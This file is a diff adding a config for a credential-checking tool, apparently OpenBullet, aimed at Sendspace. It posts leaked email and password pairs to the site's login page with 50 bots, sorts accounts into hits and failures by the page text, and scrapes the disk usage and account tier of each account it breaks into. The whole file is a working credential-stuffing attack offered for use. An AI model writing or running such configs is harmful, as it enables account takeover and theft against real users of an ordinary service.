@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Sendspace",
+  "SuggestedBots": 50,
+  "LastModified": "2018-05-10T14:15:20.2668141+00:00",
+  "AdditionalInfo": "",
+  "Author": "DADEX55",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.sendspace.com/login.html" AutoRedirect=TRUE 
+  CONTENT "action=login&submit=login&target=PQ9%2BXXkdMHOai981nKE7dmHQmmg%2B6I7CdseIiUso2xOOKGkgyuCWObEoO6uAwXpoNz4%3D&action_type=login&username=<USER>&password=<PASS>&remember=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.sendspace.com" 
+  HEADER "Referer: https://www.sendspace.com/login.html" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sign in failed. Please o:checkcapslock:o check your username\/email and password. Keep in mind that the password is case sensitive." 
+    KEY "Please check if Caps Lock is on, also check your username/email and password" 
+    KEY "You must follow the activation link in the email we sent you during registration." 
+  KEYCHAIN Success OR 
+    KEY "Logout?" 
+    KEY "<a href=\"/login.html?logout=1" 
+#CAPTURE_REQUEST REQUEST GET "https://www.sendspace.com/mysendspace/myindex.html" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" CSS "#content > div.listing.centered.limit-width > table > tbody > tr:nth-child(2) > td:nth-child(1) > ul > li" "innerHTML" 0 -> CAP "Used Diskspace" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Sendspace Free" 
